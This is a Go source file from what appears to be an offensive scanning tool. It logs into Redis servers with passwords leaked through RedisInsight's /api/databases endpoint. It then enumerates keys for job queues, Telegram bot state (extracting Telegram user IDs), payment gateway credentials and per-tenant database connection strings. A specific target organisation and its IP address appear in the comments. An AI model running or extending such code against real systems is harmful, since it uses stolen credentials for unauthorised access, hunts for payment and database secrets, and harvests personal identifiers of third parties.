package main

// enum_redis_keyspace.go — Chain B Redis keyspace analysis via RESP protocol.
//
// When enumRedisInsight recovers a Redis password via /api/databases, this file
// provides the primitives to connect directly to the Redis instance and scan for
// application-layer patterns without reading record values:
//
//   - Bull/BullMQ job queues (Node.js)
//   - Celery/Kombu task queues (Python)
//   - aiogram/Telegram FSM state (Telegram bots)
//   - EaseBuzz payment gateway settings
//   - Multi-tenant DB connection strings (org_conns:* pattern)
//   - Redis Stack search indexes (FT._LIST)

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"
)

// respConn wraps a net.Conn with buffered reading for RESP protocol parsing.
type respConn struct {
	conn    net.Conn
	reader  *bufio.Reader
	timeout time.Duration
}

func newRespConn(host string, port int, timeout time.Duration) (*respConn, error) {
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, err
	}
	return &respConn{
		conn:    conn,
		reader:  bufio.NewReader(conn),
		timeout: timeout,
	}, nil
}

func (rc *respConn) Close() {
	if rc.conn != nil {
		rc.conn.Close()
	}
}

// send writes a RESP array command to the connection.
func (rc *respConn) send(args ...string) error {
	rc.conn.SetDeadline(time.Now().Add(rc.timeout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "*%d\r\n", len(args))
	for _, arg := range args {
		fmt.Fprintf(&sb, "$%d\r\n%s\r\n", len(arg), arg)
	}
	_, err := rc.conn.Write([]byte(sb.String()))
	return err
}

// readValue reads one RESP value. Supports simple string, error, integer,
// bulk string, and array. Returns (nil, nil) for null bulk string or null array.
func (rc *respConn) readValue() (interface{}, error) {
	rc.conn.SetDeadline(time.Now().Add(rc.timeout))
	line, err := rc.reader.ReadString('\n')
	if err != nil {
		return nil, err
	}
	line = strings.TrimRight(line, "\r\n")
	if len(line) == 0 {
		return nil, fmt.Errorf("empty resp line")
	}
	switch line[0] {
	case '+':
		return line[1:], nil
	case '-':
		return nil, fmt.Errorf("%s", line[1:])
	case ':':
		return strconv.Atoi(line[1:])
	case '$':
		n, err := strconv.Atoi(line[1:])
		if err != nil {
			return nil, err
		}
		if n < 0 {
			return nil, nil
		}
		buf := make([]byte, n+2) // +2 for trailing \r\n
		if _, err := io.ReadFull(rc.reader, buf); err != nil {
			return nil, err
		}
		return string(buf[:n]), nil
	case '*':
		count, err := strconv.Atoi(line[1:])
		if err != nil {
			return nil, err
		}
		if count < 0 {
			return nil, nil
		}
		arr := make([]interface{}, count)
		for i := 0; i < count; i++ {
			arr[i], err = rc.readValue()
			if err != nil {
				return arr[:i], err
			}
		}
		return arr, nil
	}
	return nil, fmt.Errorf("unknown RESP type byte: %c", line[0])
}

// cmd sends a command and returns the reply.
func (rc *respConn) cmd(args ...string) (interface{}, error) {
	if err := rc.send(args...); err != nil {
		return nil, err
	}
	return rc.readValue()
}

// auth sends AUTH and returns true on +OK.
func (rc *respConn) auth(password string) bool {
	v, err := rc.cmd("AUTH", password)
	if err != nil {
		return false
	}
	s, ok := v.(string)
	return ok && s == "OK"
}

// dbsize returns DBSIZE for the current database (-1 on error).
func (rc *respConn) dbsize() int {
	v, err := rc.cmd("DBSIZE")
	if err != nil {
		return -1
	}
	n, ok := v.(int)
	if !ok {
		return -1
	}
	return n
}

// scanMatch iterates SCAN to collect up to maxKeys keys matching pattern.
func (rc *respConn) scanMatch(pattern string, maxKeys int) []string {
	var keys []string
	cursor := "0"
	for {
		v, err := rc.cmd("SCAN", cursor, "MATCH", pattern, "COUNT", "200")
		if err != nil {
			break
		}
		arr, ok := v.([]interface{})
		if !ok || len(arr) != 2 {
			break
		}
		newCursor, _ := arr[0].(string)
		keyArr, _ := arr[1].([]interface{})
		for _, k := range keyArr {
			if ks, ok := k.(string); ok {
				keys = append(keys, ks)
				if len(keys) >= maxKeys {
					return keys
				}
			}
		}
		cursor = newCursor
		if cursor == "0" {
			break
		}
	}
	return keys
}

// redisChainBProbe authenticates to Redis with a leaked credential and scans
// for application-layer key patterns. Returns Findings for any pattern matched.
// No key values are read — key names and FT._LIST schema only.
//
// host: the Redis server host (caller must resolve "localhost" → svc.Host)
// port: Redis port (typically 6379)
// password: the credential recovered from RedisInsight /api/databases
func redisChainBProbe(host string, port int, password string, timeout time.Duration) []Finding {
	var findings []Finding

	rc, err := newRespConn(host, port, timeout)
	if err != nil {
		return findings
	}
	defer rc.Close()

	if !rc.auth(password) {
		return findings
	}

	dbsize := rc.dbsize()

	// ── Bull / BullMQ queues (Node.js) ────────────────────────────────
	// Keys: bull:<queue>:<state|jobid>
	bullKeys := rc.scanMatch("bull:*", 300)
	if len(bullKeys) > 0 {
		queues := extractBullQueueNames(bullKeys)
		findings = append(findings, Finding{
			Category: "data",
			Title:    fmt.Sprintf("Bull/BullMQ job queues: %d queue(s), %d key(s)", len(queues), len(bullKeys)),
			Detail: fmt.Sprintf(
				"Queue names: %s. "+
					"Bull queues hold job payloads including user IDs, campaign targets, "+
					"push notification tokens, and ranking data. "+
					"Write access to queue keys injects arbitrary jobs or corrupts rankings.",
				strings.Join(queues, ", "),
			),
			Severity: "high",
			Data:     map[string]interface{}{"queues": queues, "key_count": len(bullKeys)},
		})
	}

	// ── Celery / Kombu task queues (Python) ───────────────────────────
	// Keys: _kombu.binding.<queue>, _kombu.binding.celeryev, celery-task-meta-*
	celeryKeys := rc.scanMatch("_kombu.*", 100)
	if len(celeryKeys) == 0 {
		celeryKeys = rc.scanMatch("celery-task-meta-*", 50)
	}
	if len(celeryKeys) > 0 {
		queueNames := extractCeleryQueueNames(celeryKeys)
		sample := celeryKeys
		if len(sample) > 5 {
			sample = sample[:5]
		}
		findings = append(findings, Finding{
			Category: "data",
			Title:    fmt.Sprintf("Celery/Kombu task queue: %d binding(s)", len(celeryKeys)),
			Detail: fmt.Sprintf(
				"Queue bindings: %s. Sample keys: %s.",
				strings.Join(queueNames, ", "),
				strings.Join(sample, ", "),
			),
			Severity: "medium",
			Data:     map[string]interface{}{"queues": queueNames, "keys": celeryKeys},
		})
	}

	// ── aiogram FSM state (Telegram bots) ─────────────────────────────
	// Keys: fsm:<user_id>:<chat_id>:aiogd:context:<state>:data
	fsmKeys := rc.scanMatch("fsm:*:aiogd:*", 100)
	if len(fsmKeys) > 0 {
		userIDs := extractTelegramUserIDs(fsmKeys)
		findings = append(findings, Finding{
			Category: "data",
			Title:    fmt.Sprintf("aiogram Telegram bot FSM state: %d user(s)", len(userIDs)),
			Detail: fmt.Sprintf(
				"%d aiogram-dialog FSM context key(s). Telegram user IDs in key names: %s. "+
					"FSM context keys hold conversation state; they may contain financial, "+
					"personal, or authentication data depending on the bot's dialog flows.",
				len(fsmKeys), strings.Join(userIDs, ", "),
			),
			Severity: "medium",
			Data:     map[string]interface{}{"telegram_user_ids": userIDs, "fsm_key_count": len(fsmKeys)},
		})
	}

	// ── EaseBuzz payment gateway settings ─────────────────────────────
	// Anchor: CampusIRIS (150.230.235.79) — settings:*:EASEBUZZ_SETTINGS key holds
	// Indian payment gateway API credentials.
	easebuzzKeys := rc.scanMatch("*EASEBUZZ*", 50)
	if len(easebuzzKeys) > 0 {
		findings = append(findings, Finding{
			Category: "credentials",
			Title:    fmt.Sprintf("EaseBuzz payment gateway settings in Redis: %d key(s)", len(easebuzzKeys)),
			Detail: fmt.Sprintf(
				"Keys: %s. EaseBuzz is an Indian payment gateway; "+
					"the settings key holds API credentials and merchant configuration. "+
					"Values not read.",
				strings.Join(easebuzzKeys, ", "),
			),
			Severity: "critical",
			Data:     map[string]interface{}{"keys": easebuzzKeys},
		})
	}

	// ── Multi-tenant DB connection strings ────────────────────────────
	// Anchor: CampusIRIS — org_conns:* keys hold per-tenant database connection
	// strings. The `value` field (not indexed) embeds DB credentials.
	orgConnKeys := rc.scanMatch("org_conns:*", 50)
	if len(orgConnKeys) == 0 {
		orgConnKeys = rc.scanMatch("*:tenant_primary_db", 50)
	}
	if len(orgConnKeys) > 0 {
		sample := orgConnKeys
		if len(sample) > 5 {
			sample = sample[:5]
		}
		findings = append(findings, Finding{
			Category: "credentials",
			Title:    fmt.Sprintf("Multi-tenant DB connection strings in Redis: %d record(s)", len(orgConnKeys)),
			Detail: fmt.Sprintf(
				"Keys: %s. These records hold database connection strings for tenant organizations. "+
					"The value field likely embeds per-tenant database credentials. Values not read.",
				strings.Join(sample, ", "),
			),
			Severity: "critical",
			Data:     map[string]interface{}{"keys": orgConnKeys, "count": len(orgConnKeys)},
		})
	}

	// ── Redis Stack FT._LIST ──────────────────────────────────────────
	ftListV, ftErr := rc.cmd("FT._LIST")
	if ftErr == nil {
		if arr, ok := ftListV.([]interface{}); ok && len(arr) > 0 {
			var indexes []string
			for _, v := range arr {
				if s, ok := v.(string); ok {
					indexes = append(indexes, s)
				}
			}
			findings = append(findings, Finding{
				Category: "data",
				Title:    fmt.Sprintf("Redis Stack: %d search index(es) — dbsize %d", len(indexes), dbsize),
				Detail:   fmt.Sprintf("Indexes: %s.", strings.Join(indexes, ", ")),
				Severity: "info",
				Data:     map[string]interface{}{"indexes": indexes, "dbsize": dbsize},
			})
		}
	} else if dbsize > 0 {
		findings = append(findings, Finding{
			Category: "data",
			Title:    fmt.Sprintf("Redis keyspace: %d keys (db0)", dbsize),
			Detail:   "No Redis Stack indexes (FT._LIST error). Keyspace size from DBSIZE.",
			Severity: "info",
			Data:     map[string]interface{}{"dbsize": dbsize},
		})
	}

	return findings
}

// extractBullQueueNames extracts unique queue names from Bull key patterns.
// Format: bull:<queue>:<state|jobid>
func extractBullQueueNames(keys []string) []string {
	seen := make(map[string]bool)
	var queues []string
	for _, k := range keys {
		// Split on ":" but Bull queue names can contain ":", so use SplitN 3
		parts := strings.SplitN(k, ":", 3)
		if len(parts) >= 2 {
			q := parts[1]
			if q != "" && !seen[q] {
				seen[q] = true
				queues = append(queues, q)
			}
		}
	}
	return queues
}

// extractCeleryQueueNames extracts bound queue names from _kombu keys.
func extractCeleryQueueNames(keys []string) []string {
	var names []string
	for _, k := range keys {
		if strings.HasPrefix(k, "_kombu.binding.") {
			names = append(names, strings.TrimPrefix(k, "_kombu.binding."))
		}
	}
	return names
}

// extractTelegramUserIDs extracts Telegram user IDs from aiogram FSM key names.
// Pattern: fsm:<user_id>:<chat_id>:aiogd:context:<state>:data
// Telegram user IDs are numeric; extract the first numeric segment after "fsm:".
func extractTelegramUserIDs(keys []string) []string {
	seen := make(map[string]bool)
	var ids []string
	for _, k := range keys {
		// k = "fsm:<user_id>:..."
		rest := strings.TrimPrefix(k, "fsm:")
		colon := strings.Index(rest, ":")
		var id string
		if colon > 0 {
			id = rest[:colon]
		} else {
			id = rest
		}
		if isNumericID(id) && !seen[id] {
			seen[id] = true
			ids = append(ids, id)
		}
	}
	return ids
}

func isNumericID(s string) bool {
	if len(s) == 0 {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}
